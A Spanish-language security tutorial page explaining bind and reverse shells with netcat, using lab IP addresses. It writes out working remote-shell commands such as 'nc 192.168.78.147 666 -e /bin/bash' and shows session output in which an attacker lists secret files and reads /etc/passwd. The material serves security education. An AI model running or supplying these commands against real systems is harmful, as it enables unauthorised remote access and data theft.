---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Invertir y vincular shells(Reverser/Bind Shells)

Un _shell_ es una utilidad que actúa como interfaz entre un usuario y el sistema operativo.&#x20;

En Linux existen varios entornos de shell, como Bash, ksh y tcsh.En Windows el shell es el símbolo del sistema , que se invoca mediante cmd.exe.

Windows PowerShell es un shell de Microsoft más nuevo que combina la antigua funcionalidad CMD con un nuevo conjunto de instrucciones de scripting/cmdlet con funcionalidad de administración del sistema integrada. Los cmdlets de PowerShell permiten a los usuarios y administradores automatizar tareas complicadas con scripts reutilizables.

Con un shell de enlace, un atacante abre un puerto o un escucha en el sistema comprometido y espera una conexión. Esto se hace para conectarse a la víctima desde cualquier sistema y ejecutar comandos y manipular aún más a la víctima.&#x20;

<img src="../../../.gitbook/assets/file.excalidraw (3).svg" alt="" class="gitbook-drawing">

Un shell inverso es una vulnerabilidad en la que un sistema atacante tiene un oyente (puerto abierto y la víctima inicia una conexión con el sistema atacante.

<img src="../../../.gitbook/assets/file.excalidraw (7).svg" alt="" class="gitbook-drawing">

### Netcat

```
NAME
                 nc - TCP/IP swiss army knife

SYNOPSIS
             nc [-options] hostname port[s] [ports] ...
             nc -l -p port [-options] [hostname] [port]

DESCRIPTION
             netcat is a simple unix utility which reads and writes
data across network connections, using TCP or UDP protocol. It is
designed to be a reliable "back-end" tool that can be used directly
or easily driven..........>

```

Un atacante podría usar el comando **`nc -lvp 1234 -e /bin/bash`** en el sistema comprometido (192.168.78.6) para crear un escucha en el puerto **`1234`** y ejecutar ( **-e** ) el shell Bash ( **/bin/bash** ).

#### C_reación de un shell de enlace utilizando Netcat._

```
~$ nc -lvp 1234 -e /bin/bash
listening on [any] 1234 ...
```

> Windows **nc -lvp 1234 -e cmd.exe** Netcat.

En el sistema atacante (192.168.78.147), se utiliza el comando nc -nv 192.168.78.6 1234 para conectarse con la víctima**.** Una vez que el atacante (192.168.78.147) se conecta con la víctima (192.168.78.6), se invoca el comando **ls** y se muestran tres archivos en la pantalla del atacante.

#### _Conexión al Bind Shell mediante Netcat_

```
~# nc -nv 192.168.78.6 1234
(UNKNOWN) [192.168.78.6] 1234 (?) open
ls
secret_doc_1.doc
secret_doc_2.pdf
secret_doc_3.txt
```

#### _Un atacante conectado a una víctima mediante un Bind Shell_

```
~$ nc -lvp 1234 -e /bin/bash
listening on [any] 1234 ...
connect to [192.168.78.6] from (UNKNOWN) [192.168.78.147] 52100 
```

Uno de los desafíos de usar shells de enlace es que si el sistema de la víctima está detrás de un firewall, el puerto de escucha podría estar bloqueado. Sin embargo, si el sistema de la víctima puede iniciar una conexión con el sistema atacante en un puerto determinado, se puede utilizar un shell inverso para superar este desafío.

Para crear un shell inverso, puede usar el comando **nc -lvp 666** en el sistema atacante para escuchar un puerto específico.

#### _Creación de un oyente en el sistema atacante para crear un shell inverso usando Netcat_

```
~# nc -lvp 666
listening on [any] 666 ...
192.168.78.6: inverse host lookup failed: Unknown host
connect to [192.168.78.147] from (UNKNOWN) [192.168.78.6] 32994
ls
secret_doc_1.doc
secret_doc_2.pdf
secret_doc_3.txt 

```

Luego, en el host comprometido, puede usar el comando **nc 192.168.78.147 666 -e /bin/bash** para conectarse al sistema atacante.

_Conexión al sistema atacante (Shell inverso) mediante Netcat_

```
~$ nc 192.168.78.147 666 -e /bin/bash
```

Una vez que el sistema víctima (192.168.78.6) esté conectado al sistema atacante (192.168.78.147), puede comenzar a invocar comandos.

#### _Ejecutar comandos en el sistema de la víctima a través de un Shell inverso_

```
~# nc -lvp 666
listening on [any] 666 ...
192.168.78.6: inverse host lookup failed: Unknown host
connect to [192.168.78.147] from (UNKNOWN) [192.168.78.6] 32994
ls
secret_doc_1.doc
secret_doc_2.pdf
secret_doc_3.txt
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

<output omitted for brevity>

```
